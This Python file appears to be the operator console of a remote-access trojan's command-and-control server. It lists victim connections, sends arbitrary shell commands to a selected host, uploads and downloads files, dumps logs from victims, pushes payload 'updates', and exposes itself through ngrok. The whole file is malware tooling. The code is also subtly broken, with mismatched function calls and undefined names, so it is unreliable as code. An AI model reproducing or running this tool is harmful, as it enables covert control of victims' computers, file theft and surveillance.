import sys, os

from server.main import Server

from utils.globals import clear
from utils.proc import process_kill, process_running

def select_target(server: Server, command: str) -> dict:
    if server.connections:
        if "select" in command:
            target_id = int(command.replace("select", "").strip())
            return server.connections[target_id-1]
        if "." in command:
            return server.connections[0]

def prompt(server: Server):

    help()
    while server.is_running:
        command = str(input("@server >> "))

        if command is None:
            prompt()

        if command in ['list', 'ls']:
            server.list_connections()

        if command == "help":
            help()

        if command == "cls" or command == "clear":
            clear()

        if "select" in command or "." in command:
            target = select_target(command)
            if target is not None:
                clear()
                send_commands(target)

        if "update-server" in command:
            if sys.platform == 'win32':
                ngrok_path = os.path.isfile(
                    os.path.join(os.getcwd(), "ngrok.exe"))
                ngrok_temp_path = os.path.isfile(
                    os.path.join(os.environ["TEMP"], "ngrok.exe"))

                if ngrok_path or ngrok_temp_path:
                    ip, port = get_ngrok_tunnels()
                    if ip is not None and port is not None:
                        set_server_conn(ip, port)
                else:
                    print("[-] Failed updating: 'ngrok.exe' not found")

        if command == "exit":
            print("Quiting server..")
            server.shutdown()

            _, pid = process_running("ngrok.exe")
            if pid:
                process_kill(pid)

            server.is_running = False
            server.stop()
            break


def send_commands(target: dict, target_response: str = None):
    if SERVER_IS_RUNNING:
        try:
            command = None
            if target_response is not None:
                command = str(input(f"{target_response}>> "))
            else:
                command = str(input(f"{target['hostname']} >> "))

            if not command or command == "":
                send_commands(target)

            elif "cls" in command:
                clear()
                send_commands(target)

            elif "exit" in command:
                return

            elif "shutdown" in command:
                shutdown_target(target)
                return

            elif "restart" in command:
                target["conn"].send(command.encode(ENCODING))
                del CONNECTIONS[CONNECTIONS.index(target)]
                return

            elif "upload" in command:
                file_upload(command, target["conn"])
                send_commands(target)

            elif "download" in command:
                file_download(command, target["conn"])
                send_commands(target)

            elif "dumplog" in command:
                get_logs_from_client(target["conn"], command)
                send_commands(target)

            elif "send update" in command:
                update_name = input("update path/name: ").strip()
                command = command.replace("send update", "").strip()
                command = f"upload {update_name}"
                print("[+] Sending Update: ", update_name.split('\\')[-1])
                file_upload(command, target["conn"])
                send_commands(target)

            elif command not in commands:
                target["conn"].send(command.encode(ENCODING))
                data = target["conn"].recv(1024*1024).decode(ENCODING)
                send_commands(target, data)

        except ConnectionAbortedError:
            print("[-] Failed: connection closed")
            return

        except ConnectionResetError:
            print("[-] Failed: connection closed")
            return

def shutdown_target(target: dict):
    for i, conn in enumerate(CONNECTIONS):
        if conn == target:
            target["conn"].send("shutdown".encode(ENCODING))
            del CONNECTIONS[i]